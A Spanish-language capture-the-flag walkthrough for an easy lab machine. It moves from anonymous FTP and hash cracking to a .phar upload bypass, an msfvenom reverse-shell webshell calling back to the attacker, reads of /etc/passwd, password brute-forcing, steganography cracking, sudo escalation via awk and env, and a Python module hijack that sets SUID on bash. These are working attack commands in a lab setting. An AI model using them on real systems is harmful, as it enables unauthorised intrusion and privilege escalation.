# File  

> Dificultad: Fácil

___

#### FASE RECOPILACIÓN    

Primero hacemos un **Escaneo del Objetivo**. Para ello, usamos `nmap`:  

`nmap -v -n --open -sV -sC --min-rate 5000 -oN escaneo <IP>`  

Vemos que el puerto 80 y 21 están abiertos, que trata de un Ubuntu con Apache 2.4.41 y FTP con usuario anónimo habilitado, respectivamente.  

Ahora, vamos a Enumerar los Servicios.  

Primero el FTP. Corremos: `ftp <IP>` e ingresamos `Anonymous` en el campo de usuario. Al pedir la password, sólo presionamos `Enter` y listo, estamos dentro del servidor FTP. Ahora lanzamos `dir` o `ls` y vemos el contenido.  

Vemos que hay un archivo interesante llamado `anon.txt` el cual descargamos localmente con `get anon.txt`. Ahora, en nuestro equipo, hacemos un `cat anon.txt` y nos devuelve un hash. Para saber el tipo, corremos `hashid cbfdac6008f9cab4083784cbd1874f76618d2a97` localmente y notamos que es un `MD5` el cual es muy poco seguro y fácil de crackear.  

Entonces ahora, vamos a la página https://crackstation.net/, ingresamos nuestro hash y obtenemos que es `justin`. Por el momento, eso es todo con respecto a FTP.  

Ahora Enumeremos el servicio Web:  

Primero los Directorios. Usamos `wfuzz`:  

 `wfuzz -c --hc 404 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -R 3 -u "http://<IP>/FUZZ"`  

 Obtenemos uno solo de relevacia:
 
 * /uploads  

Ahora, los Recursos. En este caso, buscamos PHP, HTML y TXT:  

`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://<IP>/FUZZ.FUZ2Z"`  

Encontramos 3:  

* /file_upload.php
* /subir_archivos.php
* /index.html

___

#### FASE EXPLOTACIÓN (Ganar Acesso):  

Una vez enumerados todos los servicios, debemos lograr entrar. Después de mucho investigar, pareciera que el *Vector* es una **WebShell**. Probamos subir archivos con extensiones comunes (JPG, PNG, PHP, TXT, etc.) en el endpoint `/file_upload.php`. Después de varios intentos, nada.  

Entonces, pasamos a descargar los recursos PHP que son los que tienen la lógica de la subida. Lo hacemos de la siguiente manera:  

* `curl -O http://<IP>/file_upload.php`
* `curl -O http://<IP>/subir_archivo.php`

Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, finalmente, intentamos con la extensión `.phar` y tenemos éxito.  

> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa para correr una WebShell.  

Ahora, teniendo en cuenta esto, pasamos a crearla con `msfvemom`:  

`msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  

> La `R` es equivalente a `-f raw` que significa *Código en Crudo*  
> Usamos el payload anterior para poder recibir la conexión reversa con alguna otra herramienta alternativa a Meterpreter, para variar.
> Aquí suponemos que el usuario www-data usa el intérprete de bash (y lo hace), pero de no funcionar, buscaríamos otro.  

Bien, una vez creada, procedemos a subirla. Tenemos éxito y nos dirigimos a `/uploads` donde verificamos la misma. Ahora, pasamos a preparar nuestro listener. En este caso, usamos [Penélope](https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nuestro listener. Corremos y ejecutamos la webshell en el navegador. Tenemos acceso.  

___

#### FASE POST-EXPLOTACIÓN  

Con un **pie dentro**, corremos `whoami` y verificamos que somos `www-data`.  

Lo primero que debemos hacer apenas entramos es **Enumerar Usuarios**. Lo hacemos de la siguiente manera:  

* `cat /etc/passwd`
* `ls -l /home`

Ahora podemos comprobar que los usuarios son 4:  

1. fernando
2. mario
3. julen
4. iker

> Todos usan el intérprete de Bash  

Lo segundo es **Buscar Credenciales en el Sistema**. Podemos hacerlo con:  

* `grep -RIin password / 2>/dev/null`
* `find / -type f -iname "password" 2>/dev/null | xargs ls -l`
* `grep -RIin -E "fernando|mario|julen|iker / 2>/dev/null`

> También podemos correr **LinPEAS** desde Penélope haciendo:
> `modules` ==> `run peass_ng`

> Además debemos buscar **Binarios SUID** y **Privilegios Sudo** para ver si así podemos **Escalar Privilegios** desde www-data, por si acaso:
> * `find / -type f -perm -4000 2>/dev/null | xargs ls -l`
> * `sudo -l`

Una vez que nos damos cuenta que no conseguimos nada con lo anterior, pasamos a crear un **Script** para crackear usuarios mediante un *Ataque de Diccionario*. Yo usé el mío [aquí](https://github.com/cobrasecx/bruters/blob/main/bruter.sh). Probando varios diccionarios, conseguimos resultados, finalmente: `fernando:chocolate`.  

> El diccionario ganador fue `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`
> Es necesario crear una lista de usuario con `nano users.txt`, por ejemplo.  

Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos **Movimiento Lateral**. Ahora, como `fernando`, vemos que no tenemos *Permisos Sudo* corriendo (`sudo -l`) ni *Binarios SUID* relevantes en el sistema.  

Ya habiendo probado varias cosas, vemos que listando nuestro home con `ls -l /home/fernando` vemos un archivo de imagen llamado `dragon-medieval.jpeg`. Parece ser nuestro Vector.  

> Cuando el Vector es una imagen, pueden ser 2 caminos:
> 1. Datos Incrustados
> 2. Steganografía

> Los Datos Incrustados es cuando se hace *append* a un archivo con otro archivo, por ejemplo `cat <img> <fichero.php> > resultado`. Esto agrega el contenido del fichero.php al final del de la imagen.  
> Por otro lado, la Steganofragía es una técnica mucho más compleja que trata de *ocultar* infomación (ficheros, etc) dentro de un archivo y requiere de herramientas específicas para tratala.

Para el caso 1, probamos con la herramienta `binwalk`:  

`binwalk dragon-medieval.jpeg`  

No obtenemos nada. No trata de un *Archivo Incrustado*.  

Seguimos con 2. Intetamos **Extraer** cualquier *información oculta*. Corremos `steghide extract -sf dragon-medieval.jpeg` y vemos que nos solicita una contraseña.  
Entonces, lanzamos `stegseek -sf dragon-medieval.jpeg -wl <diccionario>` para intentar descifrarla con un *Ataque de Diccionario*. Muy rápidamente, encontramos que la clave es `secret` y que el archivo oculto es `pass.txt`.  

Ahora corremos nuevamente `steghide extract -sf dragon-medieval.jpeg` con password `secret` y nos extrae el archivito `pass.txt`. Le corremos `cat pass.txt`, nos da un hash. Ejecutamos `hashid <hash>` y nos muestra que trata un algoritmo `SHA1`. Vamos a la web https://crackstation.net/ y resolvemos la clave: `password123`.  

Ahora, suponiendo que se trata de la contraseña de otro usuario, probamos con el resto y confirmamos nuevas credenciales con `mario:password123`. Corremos `su - mario ==> password123` y somos `mario`.  

Chequeamos **Permisos Sudo** con `sudo -l` y encontramos:  
> (julen) NOPASSWD: /usr/bin/awk  
> Tenemos *Privilegios Administrativos Sin Password* con /usr/bin/awk con el usuario julen  

Vamos a https://gtfobins.github.io/ y terminamos corriendo: `sudo -u julen awk 'BEGIN {system("/bin/bash")}'`. Ahora somos `julen`. Desde aquí, volvemos a correr `sudo -l` y obtenemos:  
`(iker) NOPASSWD: /usr/bin/env`.  
Volvemos a verificar en dicha web y resolvemos con `sudo -u iker /usr/bin/env /bin/bash`.  

Conseguimos ser `iker`. Ahora nuevamente `sudo -l` y obtenemos `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py`.  

Ahora es un poquito diferente. Leermos el python script haciendo `cat /home/iker/geo_ip.py` para saber de qué trata, qué hace y vemos que consta de devuelver los datos de una IP ingresada. Lo probamos con `sudo usr/bin/python3 /home/iker/geo_ip.py`, le pasamos alguna IP válida y verficamos.  

Habiendo leído el script, notamos que importa el módulo `request` y que utiliza su función `.get()`.  
> Un Python Script siempre busca importar los módulos a su nivel (en el mismo dir). Por lo tanto podemos suplantarlo por uno malicioso que contenga el código que nos permita finalmente **Elevar Privilegios**.

Escribimos el módulo insidioso en el mismo directorio, por ejemplo con `nano request.py`:  

```
#!/usr/bin/env python3

import os;

def get(cadena):
    os.system("chmod u+s /bin/bash");
    return "Bash alterada"

```

> Lo guardamos.
> No hace falta darle permisos de ejecución, porque el intérprete de Python3 sólo necesita poder leerlo para usarlo.  

Ahora, volvemos a correr `sudo usr/bin/python3 /home/iker/geo_ip.py`, nos da un error sin importancia, ejecutamos `bash -p`. y somos root. Eso es todo.
